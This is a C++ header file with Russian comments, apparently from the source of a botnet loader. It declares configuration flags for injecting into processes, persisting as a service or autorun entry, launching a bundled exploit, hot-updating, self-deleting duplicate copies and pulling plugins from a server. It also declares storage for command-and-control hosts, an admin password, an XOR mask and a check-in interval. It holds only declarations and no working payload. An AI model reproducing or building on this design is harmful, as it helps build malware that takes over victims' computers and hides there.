#pragma once

#include "core\core.h"
#include "config.h"

//настроечные поля для state
const int NOT_DIRECT_INJECT = 0x0001; //нельзя выполнять прямой инжект в процесс
const int NOT_USED_INJECT = 0x0002; //инжекты выполнять нельзя
const int NOT_INSTALL_SERVICE = 0x0004; //не инсталироваться как сервис
const int NOT_INSTALL_AUTORUN = 0x0008; //не устанавливаться в автозагрузку
const int EXTERN_NAME_MANAGER = 0x0010; //при старте имя менеджера не создавать, а брать из Config::nameManager
const int IS_DLL = 0x0020; //запущены как длл
const int IS_SERVICE = 0x0040; //запущен как сервис
const int RUNNED_DUBLICATION = 0x0080; //запущена 2-я копия
const int SPLOYTY_OFF = 0x0100; //не запускать сплойт
const int RUNNED_UPDATE = 0x0200; //запущен после команды горячего обновления
const int CHECK_DUPLICATION = 0x0400; //проверка на запуск копии (2-я копия самоудаляется и завершает работу)
const int PLUGINS_SERVER = 0x0800; //плагины брать с сервера (настраивается билдером)

namespace Config
{

extern char PeriodConnect[MaxSizePeriodConnect];
extern char Hosts[MaxSizeHostAdmin];
extern char Password[MaxSizePasswordAdmin];

extern char UID[32];
extern char XorMask[32];
extern int waitPeriod; //сколько ждать до следующего отстука в миллисекундах

extern char fileNameBot[MAX_PATH]; //имя автозагрузочного файла бота, заполняется при старте или при инсталяции (при инсталяции нужно обязательно заполнить)
extern char nameService[64]; //имя сервиса, если запущен как сервис

extern uint state; //различные настройки 

bool Init();

StringBuilder& NameBotExe( StringBuilder& name );
StringBuilder& FullNameBotExe( StringBuilder& path );

bool CreateMutex();
void ReleaseMutex();
//возвращает папку в которой находятся рабочие файлы бота, в path должно быть достаточное количество места
//если указан addFolder, то к пути добавляется указанная папка (если нужно, то и создается).
//cryptAddFolder = true, то addFolder шифруется
bool GetBotFolder( StringBuilder& path, const char* addFolder = 0, bool cryptAddFolder = false );

}

//стартует лоадер
bool StartBot();